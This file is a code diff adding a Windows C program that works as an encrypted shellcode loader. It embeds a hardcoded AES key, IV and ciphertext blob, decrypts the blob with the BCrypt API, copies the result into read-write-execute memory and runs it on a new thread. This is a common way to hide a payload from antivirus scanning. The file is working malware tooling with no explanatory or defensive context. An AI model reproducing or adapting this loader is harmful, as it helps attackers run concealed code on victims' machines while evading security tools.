@@ -1,0 +1,204 @@
+#include <Windows.h>
+#include <stdio.h>
+#include <bcrypt.h>
+
+#pragma comment(lib, "Bcrypt.lib")
+#define NT_SUCCESS(status)	        (((NTSTATUS)(status)) >= 0)
+
+#define KEYSIZE				32
+#define IVSIZE				16
+typedef struct _AES {
+    PBYTE	pPlainText;
+    DWORD	dwPlainSize;
+    PBYTE	pCipherText;
+    DWORD	dwCipherSize;
+    PBYTE	pKey;
+    PBYTE	pIv;
+
+}AES, * PAES;
+
+VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {
+
+    for (int i = 0; i < sSize; i++) {
+        pByte[i] = (BYTE)rand() % 0xFF;
+    }
+
+}
+VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {
+    printf("unsigned char %s[] = {", Name);
+    for (int i = 0; i < Size; i++) {
+        if (i % 16 == 0) {
+            printf("\n\t");
+        }
+        if (i < Size - 1) {
+            printf("0x%0.2X, ", Data[i]);
+        }
+        else {
+            printf("0x%0.2X ", Data[i]);
+        }
+    }
+    printf("};\n\n\n");
+}
+unsigned char pKey[] = {
+        0x99, 0x47, 0x32, 0x00, 0x99, 0xB6, 0xD5, 0x84, 0x00, 0xE3, 0x6B, 0xAB, 0x17, 0x3F, 0xB2, 0x05,
+        0xB8, 0x8F, 0x6B, 0x24, 0xBE, 0x91, 0x68, 0x5E, 0xB9, 0xE2, 0xE7, 0xCE, 0xE7, 0x1F, 0x1E, 0x9C };
+unsigned char pIv[] = {
+        0x48, 0xB9, 0xA8, 0x46, 0x98, 0xD1, 0x8F, 0x4A, 0xA9, 0x86, 0xED, 0xF2, 0xA6, 0xEF, 0xD1, 0x25 };
+unsigned char CipherText[] = {
+        0xE0, 0xCC, 0x6C, 0x6E, 0x60, 0x6C, 0xC3, 0xB4, 0xA0, 0xF6, 0xA8, 0x6F, 0x86, 0x8E, 0x71, 0x8C,
+        0xEB, 0x75, 0xBA, 0xCE, 0x11, 0x2A, 0x8E, 0x11, 0x09, 0xEA, 0x3B, 0xEE, 0xBE, 0xFF, 0x8C, 0xA7,
+        0xBA, 0x03, 0x57, 0x99, 0x64, 0x55, 0xFC, 0x1C, 0xA9, 0x67, 0xA8, 0x28, 0x28, 0x43, 0x77, 0x0E,
+        0x0D, 0x22, 0xEA, 0xB6, 0x0E, 0x75, 0xBA, 0x5E, 0x50, 0x27, 0x6F, 0x73, 0xDA, 0x96, 0x56, 0xAF,
+        0x16, 0x92, 0xD2, 0x3F, 0x8E, 0x59, 0xC3, 0x7F, 0x36, 0x71, 0xD9, 0x0C, 0xC7, 0x52, 0x24, 0xCC,
+        0x49, 0xE9, 0xBD, 0xEF, 0x4E, 0xE2, 0x65, 0x7D, 0x5C, 0x69, 0x08, 0x44, 0xF6, 0xD7, 0x8F, 0x72,
+        0x31, 0xC0, 0x1D, 0xCE, 0x01, 0xBE, 0x24, 0x25, 0xD0, 0x49, 0xB1, 0x11, 0x41, 0x89, 0xD1, 0x3A,
+        0xE2, 0x94, 0x73, 0xBE, 0xE0, 0x4E, 0x9A, 0x2D, 0x19, 0x4E, 0xF6, 0x81, 0x4D, 0xB6, 0x60, 0xD7,
+        0x76, 0x3D, 0xB9, 0xF0, 0xE5, 0x8F, 0xB1, 0xF2, 0xD7, 0xC0, 0x37, 0xE3, 0x1B, 0x7D, 0x18, 0x85,
+        0x3C, 0xF5, 0xF2, 0xE3, 0x44, 0xA8, 0x3A, 0x58, 0x14, 0x66, 0xBA, 0xEB, 0x82, 0xFA, 0xDE, 0x8D,
+        0xD1, 0x27, 0xA9, 0xAE, 0x03, 0xE6, 0xDF, 0xEE, 0xDF, 0xBD, 0x6B, 0xEC, 0x09, 0x58, 0xA4, 0x07,
+        0x3E, 0x56, 0x62, 0xCD, 0x17, 0xBB, 0x9E, 0xBF, 0xEF, 0xAA, 0x5B, 0x1B, 0x82, 0x25, 0xD0, 0xA2,
+        0x7E, 0x71, 0xAF, 0xDF, 0xB5, 0x69, 0xA7, 0xE5, 0xF7, 0x2A, 0xFD, 0x1D, 0x7F, 0x76, 0x9D, 0x8D,
+        0x48, 0x96, 0x8D, 0x4A, 0x97, 0x6A, 0x7E, 0xDD, 0x6E, 0x0B, 0xA4, 0x0B, 0xCB, 0x44, 0x3D, 0x65,
+        0xB6, 0x24, 0x8F, 0x40, 0x50, 0xCD, 0xE8, 0x3E, 0xAB, 0x63, 0x07, 0x90, 0xFD, 0x52, 0xA1, 0xAA,
+        0xC2, 0x6E, 0x66, 0x24, 0xAA, 0x15, 0x32, 0x36, 0x5B, 0xFE, 0x4E, 0x9E, 0x15, 0x1E, 0xFF, 0x42,
+        0x2A, 0x3F, 0x0D, 0x8F, 0xB9, 0x6A, 0xCD, 0xEA, 0x10, 0x94, 0x0A, 0xC4, 0xF9, 0x66, 0xDA, 0xF5,
+        0x41, 0xAE, 0x26, 0x58, 0x01, 0x10, 0xDC, 0x20, 0x7D, 0xE1, 0x72, 0x1A, 0x9C, 0xE8, 0x27, 0x51,
+        0xD8, 0x8D, 0x00, 0x46, 0xE9, 0xE5, 0x20, 0x95, 0xC5, 0x53, 0xE8, 0x3F, 0xB5, 0x85, 0x0E, 0x81,
+        0x68, 0x9F, 0xC3, 0x28, 0x12, 0x78, 0xB8, 0x37, 0x09, 0x28, 0x13, 0x9C, 0x89, 0x34, 0x9D, 0xCE,
+        0xF3, 0x38, 0xBA, 0x79, 0x04, 0xA0, 0x7E, 0x12, 0x95, 0x4F, 0x22, 0x4D, 0x8E, 0xF5, 0xFE, 0x95,
+        0xD4, 0xFE, 0x28, 0x50, 0xC7, 0x2C, 0xD3, 0x8E, 0xD5, 0xD6, 0xE4, 0xEB, 0x37, 0x00, 0x94, 0xBD };
+
+
+BOOL InstallAesDecryption(PAES pAes) {
+	BOOL				bSTATE = TRUE;
+	BCRYPT_ALG_HANDLE		hAlgorithm = NULL;
+	BCRYPT_KEY_HANDLE		hKeyHandle = NULL;
+	ULONG				cbResult = NULL;
+	DWORD				dwBlockSize = NULL;
+	DWORD				cbKeyObject = NULL;
+	PBYTE				pbKeyObject = NULL;
+	PBYTE				pbPlainText = NULL;
+	DWORD				cbPlainText = NULL,
+		STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
+	if (!NT_SUCCESS(STATUS)) {
+		printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
+	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
+	if (!NT_SUCCESS(STATUS)) {
+		printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
+	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
+	if (!NT_SUCCESS(STATUS)) {
+		printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
+	if (dwBlockSize != 16) {
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
+	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
+	if (pbKeyObject == NULL) {
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
+	STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+	if (!NT_SUCCESS(STATUS)) {
+		printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
+	STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
+	if (!NT_SUCCESS(STATUS)) {
+		printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
+	STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
+	if (!NT_SUCCESS(STATUS)) {
+		printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
+	pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
+	if (pbPlainText == NULL) {
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
+	STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
+	if (!NT_SUCCESS(STATUS)) {
+		printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
+_EndOfFunc:
+	if (hKeyHandle) {
+		BCryptDestroyKey(hKeyHandle);
+	}
+	if (hAlgorithm) {
+		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
+	}
+	if (pbKeyObject) {
+		HeapFree(GetProcessHeap(), 0, pbKeyObject);
+	}
+	if (pbPlainText != NULL && bSTATE) {
+		pAes->pPlainText = pbPlainText;
+		pAes->dwPlainSize = cbPlainText;
+	}
+	return bSTATE;
+}
+
+BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {
+	if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
+		return FALSE;
+	AES Aes = {
+		.pKey = pKey,
+		.pIv = pIv,
+		.pCipherText = pCipherTextData,
+		.dwCipherSize = sCipherTextSize
+	};
+
+	if (!InstallAesDecryption(&Aes)) {
+		return FALSE;
+	}
+
+	*pPlainTextData = Aes.pPlainText;
+	*sPlainTextSize = Aes.dwPlainSize;
+
+	return TRUE;
+}
+
+typedef int (*PayloadFunction)();
+DWORD WINAPI ExecutePayloadThread(LPVOID lpParameter) {
+	PayloadFunction payloadFunction = (PayloadFunction)lpParameter;
+	if (payloadFunction) {
+		int result = payloadFunction();
+	}
+	return 0;
+}
+
+int main() {
+	PVOID pPlaintext = NULL;
+	DWORD dwPlainSize = 0;
+	if (!SimpleDecryption(CipherText, sizeof(CipherText), pKey, pIv, &pPlaintext, &dwPlainSize)) {
+		return -1;
+	}
+	PVOID pExecutableMemory = VirtualAlloc(NULL, dwPlainSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	if (!pExecutableMemory) {
+		printf("Error: Failed to allocate executable memory\n");
+		HeapFree(GetProcessHeap(), 0, pPlaintext);
+		return -1;
+	}
+
+	memcpy(pExecutableMemory, pPlaintext, dwPlainSize);
+
+	HANDLE hThread = CreateThread(NULL, 0, ExecutePayloadThread, pExecutableMemory, 0, NULL);
+	if (hThread == NULL) {
+		printf("Error: Failed to create thread\n");
+		VirtualFree(pExecutableMemory, 0, MEM_RELEASE);
+		HeapFree(GetProcessHeap(), 0, pPlaintext);
+		return -1;
+	}
+	CloseHandle(hThread);
+
+	HeapFree(GetProcessHeap(), 0, pPlaintext);
+
+	printf("[#] Press <Enter> To Quit ... ");
+	getchar();
+
+	return 0;
+}
